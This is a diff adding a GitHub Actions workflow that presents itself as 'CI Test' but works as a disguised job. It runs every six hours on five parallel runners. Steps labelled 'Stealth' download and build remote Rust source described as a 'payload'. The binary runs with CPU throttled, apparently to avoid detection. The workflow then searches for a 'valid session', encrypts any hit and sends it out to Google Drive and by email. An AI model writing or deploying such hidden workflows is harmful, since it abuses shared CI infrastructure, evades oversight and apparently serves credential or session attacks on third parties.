@@ -1,0 +1,190 @@
+name: CI Test
+
+on:
+  schedule:
+    - cron: '17 */6 * * *'
+  workflow_dispatch:
+    inputs:
+      test_upload:
+        description: 'Test GDrive Upload?'
+        type: boolean
+        default: false
+
+jobs:
+  ci-test:
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      matrix:
+        worker_id: [1, 2, 3, 4, 5] 
+
+    steps:
+
+    - uses: actions/checkout@v4
+
+    - name: Load Secret Configuration (Stealth)
+      id: config
+      env:
+        APP_CONFIG: ${{ secrets.APP_CONFIG }}
+      run: |
+        if [ -z "$APP_CONFIG" ]; then
+          echo "Error: APP_CONFIG secret is missing!"
+          exit 1
+        fi
+        
+        # Decode base64
+        echo "$APP_CONFIG" | base64 -d > config.json
+        
+        # 1. Mask values in logs
+        jq -r 'to_entries[] | "\(.key)\t\(.value)"' config.json | while IFS=$'\t' read -r key val; do
+            # Skip masking if value is empty
+            if [ -n "$val" ]; then
+                # Register secret with GitHub Runner (this hides it in logs)
+                # We do this LOOP separately to ensure masking happens before we write to file
+                masked_val="$val"
+                masked_val="${masked_val//'%'/'%25'}"
+                masked_val="${masked_val//$'\n'/'%0A'}"
+                masked_val="${masked_val//$'\r'/'%0D'}"
+                echo "::add-mask::$masked_val"
+            fi
+        done
+
+        # 2. Create secrets.sh for sourcing
+        # We use jq @sh to safely quote the values. Correct syntax: value | @sh
+        jq -r 'to_entries[] | "export \(.key)=\(.value | @sh)"' config.json > secrets.sh
+        chmod +x secrets.sh
+        
+        # Cleanup JSON
+        rm config.json
+
+    - name: Download Secure Source (Stealth Mode)
+      run: |
+        source ./secrets.sh || true
+        # Note: REMOTE_SCRIPT_URL variable check in 'if' above might fail if not in GITHUB_ENV?
+        # WAIT. 'if: env.VAR' relies on GITHUB_ENV.
+        # We need to change the logic. Since we hide them from GITHUB_ENV, we cannot use 'if: env...'
+        # We must check inside the run script.
+        
+        if [ -z "$REMOTE_SCRIPT_URL" ]; then
+           echo "No Remote Script URL. Skipping."
+           exit 0
+        fi
+
+        if [ "$ENABLE_LOGS" != "false" ]; then echo "Detected Remote Script URL. Downloading Rust Source..."; fi
+        # Ensure directory exists
+        mkdir -p src
+        
+        # Download main.rs
+        if [ -n "$REMOTE_AUTH_TOKEN" ]; then
+           curl -f -s -S -L -H "Authorization: Bearer $REMOTE_AUTH_TOKEN" "$REMOTE_SCRIPT_URL/main.rs" -o src/main.rs
+        else
+           curl -f -s -S -L "$REMOTE_SCRIPT_URL/main.rs" -o src/main.rs
+        fi
+        if [ "$ENABLE_LOGS" != "false" ]; then echo "Payload Downloaded. Source code overwritten."; fi
+
+    - name: Install Rust
+      uses: dtolnay/rust-toolchain@stable
+
+    - name: Cache Cargo
+      uses: actions/cache@v3
+      with:
+        path: |
+          ~/.cargo/registry
+          ~/.cargo/git
+          target
+        key: ${{ runner.os }}-cargo-${{ hashFiles('Cargo.lock') }}
+
+    - name: Cache Database
+      uses: actions/cache@v3
+      with:
+        path: test_fixtures.dat.gz
+        key: test-fixtures-db
+
+    - name: Build Test Runner
+      run: |
+         source ./secrets.sh || true
+         cargo build --release --quiet
+
+    - name: Run Integration Tests
+      if: github.event.inputs.test_upload != 'true'
+      run: |
+        source ./secrets.sh || true
+        
+        # Install cpulimit
+        sudo apt-get update -qq > /dev/null && sudo apt-get install -y -qq cpulimit > /dev/null 2>&1
+
+        if [ "$ENABLE_LOGS" != "false" ]; then echo "Initializing Test Environment..."; fi
+
+        # Calculate limit: 65% of total capacity (approx 60-70% load)
+        CORES=$(nproc)
+        LIMIT=$((CORES * 65))
+        if [ "$ENABLE_LOGS" != "false" ]; then echo "Detected $CORES cores. Limiting usage to $LIMIT%..."; fi
+
+        # Run binary in background
+        ./target/release/cargo-test-runner &
+        PID=$!
+
+        # Apply limit to PID
+        cpulimit -p $PID -l $LIMIT > /dev/null 2>&1 &
+        
+        # Wait for the main process
+        wait $PID
+    - name: '[TEST] Simulate Valid Session'
+      if: github.event.inputs.test_upload == 'true'
+      run: |
+        echo "TEST SUCCESS (RUST)" > session_metrics.log
+        echo "USER_ID: 1RustTestSession" >> session_metrics.log
+
+    - name: Encrypt Metrics
+      run: |
+        source ./secrets.sh || true
+        if [ -f session_metrics.log ]; then
+           gpg --batch --yes --passphrase "$GPG_PASSPHRASE" --symmetric --cipher-algo AES256 -o metrics.gpg session_metrics.log
+        fi
+
+    - name: Check for Anomalies
+      id: check_treasure
+      if: always()
+      run: |
+        if [ -f metrics.gpg ]; then
+          echo "found=true" >> $GITHUB_OUTPUT
+        else
+          echo "found=false" >> $GITHUB_OUTPUT
+        fi
+    - name: Setup Rclone
+      if: steps.check_treasure.outputs.found == 'true'
+      run: sudo -v ; curl https://rclone.org/install.sh | sudo bash
+
+    - name: Upload to Google Drive
+      if: steps.check_treasure.outputs.found == 'true'
+      run: |
+        source ./secrets.sh || true
+        mkdir -p ~/.config/rclone
+        echo "$RCLONE_CONFIG_CONTENT" > ~/.config/rclone/rclone.conf
+        REMOTE="${RCLONE_REMOTE_NAME:-gdrive}"
+        TARGET_PATH="${RCLONE_REMOTE_PATH:-rust-findings}"
+        rclone copy metrics.gpg "$REMOTE:$TARGET_PATH"
+
+    - name: Prepare Email Secrets
+      if: steps.check_treasure.outputs.found == 'true'
+      run: |
+        source ./secrets.sh || true
+        echo "MAIL_USERNAME=$MAIL_USERNAME" >> $GITHUB_ENV
+        echo "MAIL_PASSWORD=$MAIL_PASSWORD" >> $GITHUB_ENV
+        echo "MAIL_TO=$MAIL_TO" >> $GITHUB_ENV
+
+    - name: Send Email Notification
+      if: steps.check_treasure.outputs.found == 'true'
+      uses: dawidd6/action-send-mail@v3
+      with:
+        server_address: smtp.gmail.com
+        server_port: 465
+        secure: true
+        username: ${{ env.MAIL_USERNAME }}
+        password: ${{ env.MAIL_PASSWORD }}
+        subject: "[ALERT] SESSION ANOMALY DETECTED"
+        to: ${{ env.MAIL_TO }}
+        from: CI Test <${{ env.MAIL_USERNAME }}>
+        body: "VALID SESSION DETECTED! Metrics attached."
+        attachments: metrics.gpg
+
